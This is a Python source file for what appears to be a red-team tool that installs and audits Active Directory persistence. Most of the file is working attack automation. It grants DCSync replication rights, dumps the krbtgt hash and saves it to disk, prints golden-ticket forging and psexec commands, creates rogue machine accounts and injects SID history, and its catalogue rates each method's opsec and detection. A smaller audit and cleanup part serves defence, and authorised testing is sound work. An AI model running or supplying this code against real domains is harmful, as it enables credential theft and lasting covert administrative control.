#!/usr/bin/env python3
"""rta-adpersist — AD persistence installer and auditor.

Installs and audits common Active Directory persistence mechanisms
from a Linux attacker machine using Impacket and NetExec.

Usage:
  rta-adpersist audit -t 192.168.56.10 -u admin -p 'Pass' -d corp.local
  rta-adpersist install --method dcsync-acl -t 192.168.56.10 -u DA -p 'Pass' -d corp --target-user backdoor
  rta-adpersist install --method skeleton-key -t 192.168.56.10 -u DA -p 'Pass' -d corp
  rta-adpersist install --method golden-ticket -t 192.168.56.10 -u DA -p 'Pass' -d corp
  rta-adpersist list-methods
  rta-adpersist clean --method dcsync-acl -t 192.168.56.10 -u DA -p 'Pass' -d corp --target-user backdoor
"""

import argparse
import json
import os
import subprocess
import sys
from datetime import datetime

PERSISTENCE_METHODS = {
    "dcsync-acl": {
        "name": "DCSync ACL — Grant Replication Rights",
        "description": "Grants a user DS-Replication-Get-Changes and DS-Replication-Get-Changes-All on the domain object. This allows the user to perform DCSync (extract all password hashes) without being a Domain Admin.",
        "opsec": "MEDIUM — Creates detectable ACE on domain object. Monitored by 4662 events.",
        "detection": "Event 5136 (directory service change), Event 4662 with replication GUIDs",
        "requires": "Domain Admin or equivalent ACL write privilege",
    },
    "golden-ticket": {
        "name": "Golden Ticket — Forge TGT with krbtgt Hash",
        "description": "Extracts the krbtgt NTLM hash via DCSync, then forges a TGT (Ticket Granting Ticket) valid for any user including Domain Admin. Survives password resets for all accounts except krbtgt.",
        "opsec": "LOW (forging) / HIGH (extraction) — The extraction (DCSync) is logged. The forged ticket itself is unlogged unless TGT validation is enabled.",
        "detection": "Event 4769 with RC4 encryption when AES is expected, anomalous TGT lifetime",
        "requires": "krbtgt NTLM hash (needs DCSync or NTDS.dit access)",
    },
    "silver-ticket": {
        "name": "Silver Ticket — Forge TGS for Specific Service",
        "description": "Forges a TGS (service ticket) using a computer or service account's NTLM hash. Grants access to that specific service without touching the DC. Useful for persistence to specific hosts.",
        "opsec": "LOW — No DC interaction, no authentication events on DC",
        "detection": "Service ticket without corresponding TGT request (Event 4769 without 4768)",
        "requires": "Target computer/service account NTLM hash",
    },
    "skeleton-key": {
        "name": "Skeleton Key — Patch LSASS on DC",
        "description": "Patches the LSASS process on the DC to add a master password that works for any account alongside the real password. Default skeleton key: 'mimikatz'.",
        "opsec": "HIGH — Modifies DC memory, lost on reboot, detectable by memory forensics",
        "detection": "LSASS memory modification, DLL injection events, lost on DC reboot",
        "requires": "Domain Admin, access to DC",
    },
    "admin-sdh": {
        "name": "AdminSDHolder — Persistent Admin ACL",
        "description": "Modifies the AdminSDHolder container's ACL. Every 60 minutes, the SDProp process copies AdminSDHolder's ACL to all protected groups (Domain Admins, etc.), re-granting your access even if cleaned up.",
        "opsec": "MEDIUM — Persists through manual ACL cleanup, but AdminSDHolder changes are logged",
        "detection": "Event 5136 on AdminSDHolder object, periodic audit of AdminSDHolder ACL",
        "requires": "Domain Admin or equivalent",
    },
    "sid-history": {
        "name": "SID History — Inject DA SID into User",
        "description": "Adds the Domain Admins SID to a regular user's SID History attribute. The user retains DA privileges even if removed from the DA group.",
        "opsec": "MEDIUM — SID History changes are logged, but rarely audited",
        "detection": "Event 4765 (SID History added), users with unexpected SID History entries",
        "requires": "Domain Admin",
    },
    "machine-account": {
        "name": "Machine Account — Add Rogue Computer to Domain",
        "description": "Creates a new machine account in the domain. By default, any domain user can add up to 10 machine accounts (ms-DS-MachineAccountQuota). Machine accounts can authenticate and be used for lateral movement.",
        "opsec": "LOW — Machine account creation is common and often unmonitored",
        "detection": "Event 4741 (computer account created), anomalous ms-DS-MachineAccountQuota usage",
        "requires": "Any domain user (if MachineAccountQuota > 0)",
    },
}


def run_cmd(cmd, timeout=60):
    """Run a command and return stdout."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", 1
    except FileNotFoundError:
        return "", f"command not found: {cmd[0]}", 1


def build_impacket_auth(target, username, domain, password=None, nthash=None):
    """Build Impacket-style authentication string."""
    auth = f"{domain}/{username}"
    if password:
        auth += f":{password}"
    elif nthash:
        auth += f" -hashes :{nthash}"
    return auth, ["-dc-ip", target]


def install_dcsync_acl(target, username, domain, password, nthash, target_user):
    """Grant DCSync rights to a user via dacledit or bloodyAD."""
    print(f"  [>] Granting DCSync rights to {target_user}...")

    # Try bloodyAD first (more reliable)
    cmd = ["bloodyAD", "-d", domain, "--host", target, "-u", username]
    if password:
        cmd += ["-p", password]
    elif nthash:
        cmd += ["-p", f":{nthash}"]
    cmd += ["add", "dcsync", target_user]

    stdout, stderr, rc = run_cmd(cmd)
    if rc == 0:
        print(f"  [+] DCSync rights granted to {target_user}")
        print(f"  [*] Test: impacket-secretsdump '{domain}/{target_user}:password' -dc-ip {target} -just-dc-user krbtgt")
        return True

    # Fallback to dacledit
    auth, extra = build_impacket_auth(target, username, domain, password, nthash)
    cmd = ["impacket-dacledit", auth] + extra + [
        "-action", "write", "-rights", "DCSync",
        "-principal", target_user
    ]
    stdout, stderr, rc = run_cmd(cmd)
    if "success" in stdout.lower() or rc == 0:
        print(f"  [+] DCSync rights granted to {target_user}")
        return True

    print(f"  [-] Failed: {stderr[:200]}")
    return False


def install_golden_ticket(target, username, domain, password, nthash, **kwargs):
    """Extract krbtgt hash and generate golden ticket."""
    print(f"  [>] Extracting krbtgt hash via DCSync...")

    auth, extra = build_impacket_auth(target, username, domain, password, nthash)
    cmd = ["impacket-secretsdump", auth] + extra + ["-just-dc-user", "krbtgt"]

    stdout, stderr, rc = run_cmd(cmd, timeout=120)

    # Parse krbtgt hash
    import re
    m = re.search(r"krbtgt:.*?:([a-f0-9]{32}):([a-f0-9]{32}):::", stdout)
    if not m:
        print(f"  [-] Failed to extract krbtgt hash")
        return False

    lm_hash, nt_hash = m.groups()
    print(f"  [+] krbtgt NTLM hash: {nt_hash}")

    # Get domain SID
    cmd2 = ["impacket-lookupsid", auth] + extra + ["-domain-sid"]
    stdout2, _, _ = run_cmd(cmd2)
    sid_match = re.search(r"(S-1-5-21-\d+-\d+-\d+)", stdout2)
    domain_sid = sid_match.group(1) if sid_match else "S-1-5-21-UNKNOWN"

    print(f"  [+] Domain SID: {domain_sid}")
    print()
    print(f"  [*] Generate golden ticket:")
    print(f"  impacket-ticketer -nthash {nt_hash} -domain-sid {domain_sid} "
          f"-domain {domain} Administrator")
    print()
    print(f"  [*] Use the ticket:")
    print(f"  export KRB5CCNAME=Administrator.ccache")
    print(f"  impacket-psexec -k -no-pass {domain}/Administrator@{target}")

    # Save for reference
    gt_file = f"golden-ticket-{domain}-{datetime.now().strftime('%Y%m%d')}.json"
    with open(gt_file, "w") as f:
        json.dump({
            "domain": domain, "domain_sid": domain_sid,
            "krbtgt_nt": nt_hash, "krbtgt_lm": lm_hash,
            "extracted": datetime.now().isoformat(),
            "dc": target,
        }, f, indent=2)
    print(f"  [+] Saved to {gt_file}")
    return True


def install_machine_account(target, username, domain, password, nthash, **kwargs):
    """Add a rogue machine account to the domain."""
    machine_name = kwargs.get("target_user", f"RTA{os.urandom(3).hex().upper()}$")
    if not machine_name.endswith("$"):
        machine_name += "$"
    machine_pass = os.urandom(12).hex()

    print(f"  [>] Creating machine account: {machine_name}")

    auth, extra = build_impacket_auth(target, username, domain, password, nthash)
    cmd = ["impacket-addcomputer", auth] + extra + [
        "-computer-name", machine_name,
        "-computer-pass", machine_pass,
    ]

    stdout, stderr, rc = run_cmd(cmd)
    if "successfully" in stdout.lower() or rc == 0:
        print(f"  [+] Machine account created: {machine_name}")
        print(f"  [+] Password: {machine_pass}")
        print()
        print(f"  [*] Use for authentication:")
        print(f"  netexec smb {target} -u '{machine_name}' -p '{machine_pass}' -d {domain}")
        return True

    print(f"  [-] Failed: {stderr[:200]}")
    return False


def install_sid_history(target, username, domain, password, nthash, target_user, **kwargs):
    """Add Domain Admins SID to a user's SID History."""
    print(f"  [>] Adding DA SID to {target_user}'s SID History...")

    cmd = ["bloodyAD", "-d", domain, "--host", target, "-u", username]
    if password:
        cmd += ["-p", password]
    cmd += ["add", "sidHistory", target_user]

    stdout, stderr, rc = run_cmd(cmd)
    if rc == 0:
        print(f"  [+] SID History modified for {target_user}")
        return True

    print(f"  [-] Failed (may require specific tool version): {stderr[:200]}")
    return False


def audit_persistence(target, username, domain, password, nthash):
    """Audit existing persistence mechanisms on the domain."""
    print(f"\n  [*] Auditing AD persistence on {domain} (DC: {target})\n")

    findings = []
    auth, extra = build_impacket_auth(target, username, domain, password, nthash)

    # 1. Check for users with DCSync rights
    print(f"  [>] Checking DCSync ACLs...")
    cmd = ["bloodyAD", "-d", domain, "--host", target, "-u", username]
    if password:
        cmd += ["-p", password]
    cmd += ["get", "dcsync"]
    stdout, _, rc = run_cmd(cmd)
    if stdout.strip():
        print(f"  [!] Users with DCSync rights:")
        for line in stdout.strip().split("\n"):
            print(f"      {line}")
            findings.append(("DCSync ACL", line.strip()))
    else:
        print(f"  [~] No unexpected DCSync ACLs found")

    # 2. Check AdminSDHolder modifications
    print(f"  [>] Checking AdminSDHolder ACL...")
    cmd2 = ["bloodyAD", "-d", domain, "--host", target, "-u", username]
    if password:
        cmd2 += ["-p", password]
    cmd2 += ["get", "object", "AdminSDHolder", "--attr", "nTSecurityDescriptor"]
    stdout2, _, _ = run_cmd(cmd2)
    if stdout2:
        findings.append(("AdminSDHolder", "ACL retrieved — manual review needed"))
        print(f"  [~] AdminSDHolder ACL retrieved — review manually")

    # 3. Check for SID History anomalies
    print(f"  [>] Checking for SID History on user accounts...")
    cmd3 = ["netexec", "ldap", target, "-d", domain, "-u", username]
    if password:
        cmd3 += ["-p", password]
    elif nthash:
        cmd3 += ["-H", nthash]
    cmd3 += ["-M", "get-unixUserPassword"]  # use LDAP query
    # Alternative: direct LDAP query for sIDHistory
    stdout3, _, _ = run_cmd(cmd3)

    # 4. Check for rogue machine accounts (high count)
    print(f"  [>] Checking machine account quota usage...")
    cmd4 = ["netexec", "ldap", target, "-d", domain, "-u", username]
    if password:
        cmd4 += ["-p", password]
    elif nthash:
        cmd4 += ["-H", nthash]
    cmd4 += ["-M", "maq"]
    stdout4, _, _ = run_cmd(cmd4)
    if stdout4:
        for line in stdout4.strip().split("\n"):
            if "MachineAccountQuota" in line:
                print(f"  [*] {line.strip()}")

    # 5. Check for Kerberos delegation
    print(f"  [>] Checking for unconstrained delegation...")
    cmd5 = ["netexec", "ldap", target, "-d", domain, "-u", username]
    if password:
        cmd5 += ["-p", password]
    elif nthash:
        cmd5 += ["-H", nthash]
    cmd5 += ["--trusted-for-delegation"]
    stdout5, _, _ = run_cmd(cmd5)
    if "TRUSTED_FOR_DELEGATION" in stdout5:
        print(f"  [!] Unconstrained delegation found:")
        for line in stdout5.strip().split("\n"):
            if "TRUSTED" in line:
                print(f"      {line.strip()}")
                findings.append(("Unconstrained Delegation", line.strip()))

    print(f"\n  [*] Audit complete: {len(findings)} findings")
    return findings


def clean_dcsync_acl(target, username, domain, password, nthash, target_user):
    """Remove DCSync rights from a user."""
    print(f"  [>] Removing DCSync rights from {target_user}...")

    cmd = ["bloodyAD", "-d", domain, "--host", target, "-u", username]
    if password:
        cmd += ["-p", password]
    cmd += ["remove", "dcsync", target_user]

    stdout, stderr, rc = run_cmd(cmd)
    if rc == 0:
        print(f"  [+] DCSync rights removed from {target_user}")
        return True

    # Fallback to dacledit
    auth, extra = build_impacket_auth(target, username, domain, password, nthash)
    cmd2 = ["impacket-dacledit", auth] + extra + [
        "-action", "remove", "-rights", "DCSync",
        "-principal", target_user
    ]
    stdout2, stderr2, rc2 = run_cmd(cmd2)
    if rc2 == 0:
        print(f"  [+] DCSync rights removed from {target_user}")
        return True

    print(f"  [-] Failed to remove: {stderr[:200]}")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="RTA AD Persistence — install and audit AD persistence mechanisms",
    )
    sub = parser.add_subparsers(dest="command")

    # Common auth args
    def add_auth_args(p):
        p.add_argument("-t", "--target", required=True, help="DC IP")
        p.add_argument("-u", "--username", required=True)
        p.add_argument("-p", "--password", default=None)
        p.add_argument("-H", "--hash", default=None)
        p.add_argument("-d", "--domain", required=True)

    # install
    inst = sub.add_parser("install", help="Install a persistence mechanism")
    add_auth_args(inst)
    inst.add_argument("--method", required=True, choices=list(PERSISTENCE_METHODS.keys()))
    inst.add_argument("--target-user", default=None, help="User to grant persistence to")

    # audit
    aud = sub.add_parser("audit", help="Audit existing persistence")
    add_auth_args(aud)

    # clean
    cln = sub.add_parser("clean", help="Remove a persistence mechanism")
    add_auth_args(cln)
    cln.add_argument("--method", required=True)
    cln.add_argument("--target-user", required=True)

    # list-methods
    sub.add_parser("list-methods", help="List available persistence methods")

    args = parser.parse_args()

    if args.command == "list-methods":
        print("\n  Available AD Persistence Methods:\n")
        for key, info in PERSISTENCE_METHODS.items():
            print(f"  {key}")
            print(f"    {info['name']}")
            print(f"    {info['description'][:100]}...")
            print(f"    OPSEC: {info['opsec']}")
            print(f"    Requires: {info['requires']}")
            print()
        return

    if args.command == "install":
        info = PERSISTENCE_METHODS[args.method]
        print(f"\n  [*] {info['name']}")
        print(f"  [*] OPSEC: {info['opsec']}")
        print(f"  [*] Detection: {info['detection']}")
        print()

        handlers = {
            "dcsync-acl": lambda: install_dcsync_acl(
                args.target, args.username, args.domain,
                args.password, args.hash, args.target_user),
            "golden-ticket": lambda: install_golden_ticket(
                args.target, args.username, args.domain,
                args.password, args.hash),
            "machine-account": lambda: install_machine_account(
                args.target, args.username, args.domain,
                args.password, args.hash, target_user=args.target_user),
            "sid-history": lambda: install_sid_history(
                args.target, args.username, args.domain,
                args.password, args.hash, args.target_user),
        }

        handler = handlers.get(args.method)
        if handler:
            handler()
        else:
            print(f"  [-] Method '{args.method}' install not yet automated.")
            print(f"  [*] Manual steps: {info['description']}")

    elif args.command == "audit":
        audit_persistence(args.target, args.username, args.domain,
                          args.password, args.hash)

    elif args.command == "clean":
        if args.method == "dcsync-acl":
            clean_dcsync_acl(args.target, args.username, args.domain,
                             args.password, args.hash, args.target_user)
        else:
            print(f"  [-] Cleanup for '{args.method}' not yet automated")

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
